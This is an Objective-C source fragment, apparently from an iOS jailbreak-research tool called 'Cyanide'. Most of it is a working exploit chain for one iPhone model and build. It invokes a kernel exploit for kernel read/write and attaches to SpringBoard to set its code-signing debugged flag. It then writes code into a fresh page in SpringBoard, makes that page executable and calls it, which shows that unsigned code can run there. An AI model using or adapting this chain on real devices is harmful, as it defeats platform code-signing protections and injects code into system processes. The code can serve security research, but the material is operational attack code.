        if (resetOut) *resetOut = reset;
        return false;
    }
    bool bound = session.pid == pid && session.taskAddr == expectedTask &&
        CNDIdentityMatches(api, pid, expectedProc, expectedTask);
    CNDRecord(@"remoteCallIdentityBound", @(bound));
    if (!bound) {
        if ([session hasLocalState] && ![session hasInFlightSyntheticCall]) {
            (void)[session destroyRemoteCall];
        }
        CNDRecord(@"result", @"failed-springboard-remotecall-identity");
        bool reset = CNDForceSpringBoardRestart(
            api, pid, expectedProc, expectedTask);
        CNDRecord(@"springBoardFinalResetProven", @(reset));
        if (resetOut) *resetOut = reset;
        return false;
    }

    __block uint64_t page = 0;
    __block int64_t protectResult = -1;
    __block int protectErrno = 0;
    __block uint64_t nonceResult = 0;
    __block bool transportHealthy = false;
    __block bool statusReadable = false;
    __block uint32_t flagsAfter = 0;
    @try {
        api->withSession(session, ^{
            uint64_t status = api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "malloc", sizeof(uint32_t),
                0, 0, 0, 0, 0, 0, 0);
            if (!status || !api->remoteSuccess()) return;
            (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                "memset", status, 0, sizeof(uint32_t), 0, 0, 0, 0, 0);
            int64_t statusResult = (int64_t)api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "csops", (uint64_t)pid,
                CND_CS_OPS_STATUS, status, sizeof(uint32_t), 0, 0, 0, 0);
            statusReadable = statusResult == 0 && api->remoteSuccess() &&
                [session remoteRead:status to:&flagsAfter
                    size:sizeof(flagsAfter)];
            if (api->remoteSuccess()) {
                (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                    "free", status, 0, 0, 0, 0, 0, 0, 0);
            }
            if (!statusReadable || (flagsAfter & CND_CS_DEBUGGED) == 0) {
                return;
            }
            uint64_t pageSize = api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "getpagesize",
                0, 0, 0, 0, 0, 0, 0, 0);
            if (pageSize < 4096 || pageSize > 65536 ||
                (pageSize & (pageSize - 1)) != 0) return;
            page = api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS, "mmap",
                0, pageSize, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANON, UINT64_MAX, 0, 0, 0);
            if (!page || page == UINT64_MAX || !api->remoteSuccess()) return;

            uint64_t scratch = api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "malloc",
                sizeof(kCNDRXNonceCode), 0, 0, 0, 0, 0, 0, 0);
            bool scratchWritten = scratch && [session remoteWrite:scratch
                from:kCNDRXNonceCode size:sizeof(kCNDRXNonceCode)];
            uint64_t copied = scratchWritten ? api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "memcpy", page, scratch,
                sizeof(kCNDRXNonceCode), 0, 0, 0, 0, 0) : 0;
            if (scratch && api->remoteSuccess()) {
                (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                    "free", scratch, 0, 0, 0, 0, 0, 0, 0);
            }
            if (copied != page || !api->remoteSuccess()) return;

            (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                "sys_icache_invalidate", page, sizeof(kCNDRXNonceCode),
                0, 0, 0, 0, 0, 0);
            protectResult = (int64_t)api->remoteDlsymCall(
                CND_REMOTE_TIMEOUT_SECONDS, "mprotect", page, pageSize,
                PROT_READ | PROT_EXEC, 0, 0, 0, 0, 0);
            if (protectResult != 0 && api->remoteSuccess()) {
                uint64_t errnoAddress = api->remoteDlsymCall(
                    CND_REMOTE_TIMEOUT_SECONDS, "__error",
                    0, 0, 0, 0, 0, 0, 0, 0);
                if (errnoAddress) {
                    uint32_t remoteErrno = 0;
                    if ([session respondsToSelector:
                            @selector(remoteRead:to:size:)]) {
                        BOOL read = [(id)session remoteRead:errnoAddress
                            to:&remoteErrno size:sizeof(remoteErrno)];
                        if (read) protectErrno = (int)remoteErrno;
                    }
                }
            }
            if (protectResult == 0 && api->remoteSuccess()) {
                nonceResult = [session doRemoteCallStableWithTimeout:
                    CND_REMOTE_TIMEOUT_SECONDS functionAddress:page
                    functionName:"cnd_rx_nonce" x0:0 x1:0 x2:0 x3:0
                    x4:0 x5:0 x6:0 x7:0];
            }
            if (CNDIdentityMatches(api, pid, expectedProc, expectedTask) &&
                api->remoteSuccess()) {
                (void)api->remoteDlsymCall(CND_REMOTE_TIMEOUT_SECONDS,
                    "munmap", page, pageSize, 0, 0, 0, 0, 0, 0);
            }
            transportHealthy = api->remoteSuccess();
        });
    } @catch (NSException *exception) {
        CNDRecord(@"remoteCallException", [NSString stringWithFormat:@"%@:%@",
            exception.name ?: @"exception", exception.reason ?: @"unknown"]);
    }

    CNDRecord(@"rxPage", CNDHex(page));
    CNDRecord(@"targetCSFlagsAfterAttach", CNDHex(flagsAfter));
    CNDRecord(@"targetCSFlagsAfterAttachReadable", @(statusReadable));
    bool debuggedObserved = statusReadable &&
        (flagsAfter & CND_CS_DEBUGGED) != 0;
    if (debuggedObservedOut) *debuggedObservedOut = debuggedObserved;
    CNDRecord(@"rxProtectResult", @(protectResult));
    CNDRecord(@"rxProtectErrno", @(protectErrno));
    CNDRecord(@"rxNonceResult", CNDHex(nonceResult));
    CNDRecord(@"remoteTransportHealthyAfterNonce", @(transportHealthy));
    bool success = protectResult == 0 && nonceResult == UINT64_C(0xc0de) &&
        transportHealthy;
    CNDRecord(@"csAllowInvalidObserved", @(debuggedObserved));
    CNDRecord(@"rxExecutionSuccess", @(success));
    CNDRecord(@"result", success ? @"success-private-rx-executed" :
        @"failed-private-rx-not-executed");
    CNDRecord(@"state", @"result-persisted-before-springboard-reset");

    bool reset = CNDTerminateSpringBoardSession(
        api, session, pid, expectedProc, expectedTask);
    if (!reset) {
        reset = CNDForceSpringBoardRestart(
            api, pid, expectedProc, expectedTask);
    }
    CNDRecord(@"springBoardFinalResetProven", @(reset));
    if (resetOut) *resetOut = reset;
    return success;
}

static void CNDRunProbe(void)
{
    @autoreleasepool {
        CNDRecord(@"state", @"starting");
        NSString *build = CNDOSBuild();
        CNDRecord(@"osBuild", build);
        if (![build isEqualToString:@CND_EXPECTED_BUILD]) {
            CNDRecord(@"result", @"refused-wrong-build");
            return;
        }

        CNDProbeAPI api = {0};
        bool apiResolved = false;
        for (unsigned int attempt = 0; attempt < 50; attempt++) {
            if (CNDResolveAPI(&api)) {
                apiResolved = true;
                break;
            }
            usleep(100000);
        }
        if (!apiResolved) {
            CNDRecord(@"result", @"refused-probe-api-unavailable");
            return;
        }

        gCNDKRWCleanup = api.krwCleanup;
        bool initiallyReady = api.krwReady();
        CNDRecord(@"krwInitiallyReady", @(initiallyReady));
        if (!initiallyReady) {
            gCNDKRWAcquisitionAttempted = true;
            CNDRecord(@"state", @"acquiring-krw");
            int exploitResult = api.kexploit();
            CNDRecord(@"kexploitResult", @(exploitResult));
        }

        bool ready = api.krwReady() && api.kernelBase &&
            CNDKernelPointer(*api.kernelBase);
        CNDRecord(@"krwValidated", @(ready));
        if (!ready) {
            CNDRecord(@"result", @"refused-krw-not-ready");
            return;
        }
        CNDRecord(@"state", @"validating-exact-kernel");
        if (!CNDVerifyExactKernel(&api)) {
            CNDRecord(@"result", @"refused-kernel-identity");
            return;
        }

        NSError *resolveError = nil;
        pid_t pid = api.resolveProcessPID(@"SpringBoard", &resolveError);
        CNDRecord(@"springBoardPIDResolver",
            @"CNDKernelTaskBridgeResolveProcessPID");
        CNDRecord(@"springBoardPID", @(pid));
        if (resolveError) {
            CNDRecord(@"springBoardPIDResolverError",
                resolveError.localizedDescription ?: @"");
        }
        if (pid <= 1) {
            CNDRecord(@"result",
                @"refused-snowboard-springboard-pid-unavailable");
            return;
        }
        uint64_t proc = api.procFind(pid);
        uint64_t task = CNDKernelPointer(proc) ? api.procTask(proc) : 0;
        usleep(200000);
        NSError *stableResolveError = nil;
        pid_t stablePID = api.resolveProcessPID(
            @"SpringBoard", &stableResolveError);
        uint64_t stableProc = stablePID > 1
            ? api.procFind(stablePID) : 0;
        uint64_t stableTask = CNDKernelPointer(stableProc)
            ? api.procTask(stableProc) : 0;
        pid_t kernelPID = CNDKernelPointer(proc)
            ? (pid_t)api.kread32(proc + *api.procPIDOffset) : 0;
        const char *name = api.procName(proc);
        NSString *kernelName = name
            ? ([NSString stringWithUTF8String:name] ?: @"") : @"";
        uint64_t legacyNameProc = api.procFindByName("SpringBoard");
        bool identity = stablePID == pid && stableProc == proc &&
            stableTask == task &&
            kernelPID == pid && CNDIdentityMatches(
                &api, pid, proc, task);
        CNDRecord(@"springBoardStablePID", @(stablePID));
        if (stableResolveError) {
            CNDRecord(@"springBoardStablePIDResolverError",
                stableResolveError.localizedDescription ?: @"");
        }
        CNDRecord(@"springBoardKernelPID", @(kernelPID));
        CNDRecord(@"springBoardProc", CNDHex(proc));
        CNDRecord(@"springBoardTask", CNDHex(task));
        CNDRecord(@"springBoardKernelNameAtConfiguredOffset", kernelName);
        CNDRecord(@"springBoardKernelNameMatchesExpected",
            @([kernelName isEqualToString:@"SpringBoard"]));
        CNDRecord(@"springBoardLegacyNameLookupProc",
            CNDHex(legacyNameProc));
        CNDRecord(@"springBoardIdentityVerified", @(identity));
        if (!identity) {
            CNDRecord(@"result", @"refused-springboard-identity");
            return;
        }

        uint32_t flagsBefore = 0;
        bool flagsBeforeReadable = CNDReadTargetCSFlagsRemote(
            &api, pid, proc, task, &flagsBefore);
        CNDRecord(@"targetCSFlagsBeforeReadable", @(flagsBeforeReadable));
        CNDRecord(@"targetCSFlagsBefore", CNDHex(flagsBefore));
        if (!flagsBeforeReadable) {
            CNDRecord(@"result", @"refused-cs-status-unreadable");
            return;
        }
        if ((flagsBefore & CND_CS_DEBUGGED) != 0) {
            CNDRecord(@"result", @"refused-target-already-debugged");
            return;
        }

        bool attached = CNDEnableThroughAttach(&api, pid, proc, task);
        CNDRecord(@"attachDetachCompleted", @(attached));
        if (!attached) {
            /* CNDEnableThroughAttach already resets SpringBoard after every
             * post-accept failure. A rejected attach does not mutate it and
             * therefore must not cause a gratuitous respring here. */
            if (!gCNDProbeTerminateHostAfterRun) {
                CNDRecord(@"result", @"attach-or-cs-allow-invalid-failed");
            }
            return;
        }

        bool debuggedObserved = false;
        bool reset = false;
        (void)CNDRunRXNonce(
            &api, pid, proc, task, &debuggedObserved, &reset);
    }
}

static void CNDReleaseKRW(void)
{
    if (!gCNDKRWCleanup) return;
    if (!gCNDKRWAcquisitionAttempted && !gCNDProbeTerminateHostAfterRun) {
        CNDRecord(@"krwLeftOpenBecausePreexisting", @YES);
        return;
    }
    bool readyBeforeCleanup = false;
    CNDKRWReadyFn ready = (CNDKRWReadyFn)dlsym(
        RTLD_DEFAULT, "kexploit_krw_ready");
    if (ready) readyBeforeCleanup = ready();
    CNDRecord(@"krwReadyBeforeCleanup", @(readyBeforeCleanup));
    bool parked = gCNDKRWCleanup();
    CNDRecord(@"krwTerminalCleanupParked", @(parked));
}

static NSString *CNDHardwareModel(void)
{
    char model[64] = {0};
    size_t size = sizeof(model);
    if (sysctlbyname("hw.machine", model, &size, NULL, 0) != 0 ||
        model[0] == '\0') return @"";
    return [NSString stringWithUTF8String:model] ?: @"";
}

BOOL CNDPhysicalCSAllowInvalidProbeIsSupported(NSString **reasonOut)
{
    NSString *model = CNDHardwareModel();
    NSString *build = CNDOSBuild();
    BOOL supported = [model isEqualToString:@"iPhone17,2"] &&
        [build isEqualToString:@CND_EXPECTED_BUILD];
    if (reasonOut) {
        *reasonOut = supported ? @"Exact iPhone17,2 / 23A341 target matched."
            : [NSString stringWithFormat:
                @"Requires iPhone17,2 on build 23A341; this device is %@ on %@.",
                model.length ? model : @"unknown hardware",
                build.length ? build : @"unknown build"];
    }
    return supported;
}

BOOL CNDPhysicalCSAllowInvalidProbeIsRunning(void)
{
    return __sync_fetch_and_add(&gCNDProbeRunActive, 0) != 0;
}

void CNDPhysicalCSAllowInvalidProbeRun(
    CNDPhysicalCSAllowInvalidProbeCompletion completion)
{
    NSString *supportReason = nil;
    if (!CNDPhysicalCSAllowInvalidProbeIsSupported(&supportReason)) {
        NSDictionary *report = @{
            @"result": @"refused-unsupported-device",
            @"message": supportReason ?: @"Unsupported device.",
        };
        dispatch_async(dispatch_get_main_queue(), ^{ completion(report); });
        return;
    }
    if (!__sync_bool_compare_and_swap(&gCNDProbeRunActive, 0, 1)) {
        NSDictionary *report = @{
            @"result": @"refused-already-running",
            @"message": @"The physical RX probe is already running.",
        };
        dispatch_async(dispatch_get_main_queue(), ^{ completion(report); });
        return;
    }

    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    gCNDReportPath = [directory stringByAppendingPathComponent:
        @"CNDPhysicalCSAllowInvalidProbe.json"];
    gCNDKRWCleanup = NULL;
    gCNDKRWAcquisitionAttempted = false;
    gCNDProbeTerminateHostAfterRun = false;
    gCNDResolvedProcNameOffset = 0;
    gCNDReport = [@{
        @"probe": @"physical-cs-allow-invalid-private-rx",
        @"expectedBuild": @CND_EXPECTED_BUILD,
        @"target": @"SpringBoard",
        @"armed": @YES,
        @"userTriggered": @YES,
        @"safety": @"PT_ATTACHEXC only; no PT_TRACE_ME fallback; a successful attach saves the result, restarts SpringBoard, parks KRW, and terminates Cyanide",
    } mutableCopy];
    CNDRecord(@"reportPath", gCNDReportPath);
    CNDRecord(@"state", @"user-confirmed");

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        CNDRunProbe();
        CNDReleaseKRW();
        if (gCNDProbeTerminateHostAfterRun) {
            CNDRecord(@"cyanideTerminationRequested", @YES);
            (void)kill(getpid(), SIGKILL);
            _exit(0);
        }
        NSDictionary<NSString *, id> *report = nil;
        @synchronized (gCNDReport) {
            report = [gCNDReport copy];
        }
        __sync_lock_release(&gCNDProbeRunActive);
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}
